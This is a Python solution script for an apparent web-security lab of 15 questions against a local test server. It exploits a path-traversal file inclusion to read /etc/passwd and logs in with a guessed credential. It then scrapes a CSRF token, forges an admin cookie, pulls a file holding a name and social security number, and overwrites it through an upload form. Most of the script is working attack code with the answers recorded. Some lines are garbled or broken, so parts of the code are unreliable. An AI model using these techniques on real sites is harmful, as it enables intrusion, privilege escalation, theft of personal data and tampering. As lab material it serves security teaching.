import urllib.request
import requests
import bs4
import re
import base64

# 1. Open the URL http://192.168.229.105 with the urllib module in Python. What is the name of the development page that is unveiled to you?

with urllib.request.urlopen("http://192.168.229.105") as response:
    print(response.read())
    # DRAFT System - Dynamic Access & File Tracking
    #print(response.getcode(), response.geturl())
    #print(response.info)

####################################################################################

# 2. Access the development page. What does the header on the page say?

with urllib.request.urlopen("http://192.168.229.105/dev/access.php") as response:
    print(response.read())

# b'This page must be requested with the <code>requests</code> module in Python

r = requests.get("http://192.168.229.105/dev/access.php")
r.content

# Draft Developer Protal

####################################################################################

# 3. What is the URL for the response you received, has it changed?
r.url
# http://192.168.229.105/include.php?file=development_homepage.php

####################################################################################

# 4. What page were you last redirected from?
r.history
# <response [302]>

r.history[-1].url
# http://192.168.229.105/page_redirectory.php

####################################################################################

# 5. This new URL format looks like a potential vulnerability. You have the opportunity to take advantage of a basic Local File Inclusion vulnerability. Access the /etc/passwd file on the web server. What username is the last on the list?

passwd = requests.get("http://192.168.229.105/include.php?file=../../../../../../etc/passwd")

# meaghyn

####################################################################################

# 6. The development page links to another page that requires authentication, but you should have an idea for a username and password now. Access the page with the new credentials. What does the header on the page say?

auth = requests.get("http://192.168.229.105/portal/index.php", auth = ("meaghyn", "meaghyn"))
auth.text


# {'Date': 'Mon, 025 Apr 2021 16:47:58 GMT', 'Server': 'Apache/2.4.10 (Debian)', 'Set-Cookie': 'PHPSESSIONID=oef46l4gt302ojc21e2eim6924; path=/' , 'Expires': 'Thur, 19 Nov 1981 08:52:00 GMT', 'Cache-Control': 'no-store, no-cache, must-revalidate, postcheck=0, pre-check=0', 'Pragma': 'no-cache', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Lenght': '330', 'Keep-Alive', 'Content-type': 'text/html; charset=UTF-8'}

####################################################################################

# 7. You should set up a “Session” to view this portion of the website and reset your password. You have the opportunity to scrape out and abuse a Cross-Site Request Forgery token. POST the required form data to continue. What syntax did you use?

s = requests.session()
s.auth = ("meaghyn", "meaghyn")
r = s.get("http://192.168.229.105/portal/change_password.php", auth = ("meaghyn", "meaghyn"))
values = {"New Password": "mypass", "Confirm Password": "mypass"}
s.post("http://192.168.229.105/portal/change_password.php", params=values)

site = bs4.BeautifulSoup(auth.text)
for input in site.find_all('input'):
    try:
        print(input['value'])
    except:
        continue

# regex notes
# csrf = re.findall('"csrf_token" value=(.*?"', r.text)[0])
# print(csrf)
#
# BeautifulSoup
# soup = bs4.BeautifuleSoup(r.text, "html")
# csrf = soup.find(attrs={"name":"csrf_token"})['value']
# print(csrf)

####################################################################################

# 8. The current page set a cookie (aside from your session ID). What is the name and value of this cookie?

for input in site.find_all('input'):
    print(input)

# name="csrf_token" value="33db4f3e728f565021d0c66elaf575d2"

####################################################################################

# 9. Change the cookie value to become an admin user level and access the page once more. What does the header on the page say?


s.cookies.update({'user_level':'admin'})

####################################################################################

# 10. Now that you have the admin account, you can view the maintained files. How many links are present on this page?

# regex
print(len(re.findall("<a .*?</a>", r.text)))

#BeatutifulSoup
soup = bs4.BeautifulSoup(r.text)
print(len(soup.find_all('a')))

####################################################################################

# 11. The linked pages look to be encoded, but the links do not go anywhere! One page potentially has leaked PII. What is the name of this file?

soup = bs4.BeautifulSoup(r.text)
for link in soup.find_all('a'):
    filename = link['href']
    filename = re.search("/(.*)\.txt",filename).group(1)
    decoded = base64.b64decode(filename).decode('ascii')
    if re.search("pii",decoded, re.IGNORECASE):
        print(decoded)

# jun_8_1949_pii

####################################################################################

# 12. Try to access the PII file with the decoded filename. What is the name and social security number of the individual you just found information on? (I.e., in the case of the filenames, http://192.168.229.105/ REMzQ1RB.txt becomes http://192.168.229.105/DC3CTA.txt)

r = s.get('http://192.168.229.105/portal/files/jun_8_1949_pii.txt', auth = ("meaghyn", "meaghyn"), cookies = { "user_level":"admin"})
print(r.text)

# 132-875-1984

####################################################################################

# 13. The PII file leaked even more information than we expected. What is the filename for the new page that you found?

print(base64.b32decode(r.text.split('\n')[-2]))

####################################################################################

# 14. Accessing this new page, use the file upload functionality to overwrite the PII file that you have just accessed. Use the same filename to replace it with some bogus data! What syntax did you use?

s.cookies.update({"user_level":"admin"})
r = s.post("http://192.168.229.105/portal/file_upload.php", auth = ("meaghyn", "meaghyn"), data = {"submit":"Upload"}, files = {"filename": open("jun_8_1949_pii.txt")})

r = s.get('http://192.168.229.105/portal/files/jun_8_1949_pii.txt', auth = ("meaghyn", "meaghyn"), cookies = { "user_level":"admin"})
print(r.text)

####################################################################################

# 15. When you have successfully overwritten the PII file, access http://192.168.229.105/integrity_check.php. What is the message you are greeted with?

r = s.get("http://192.168.229.105/integrity_check.php")
print(r.text)
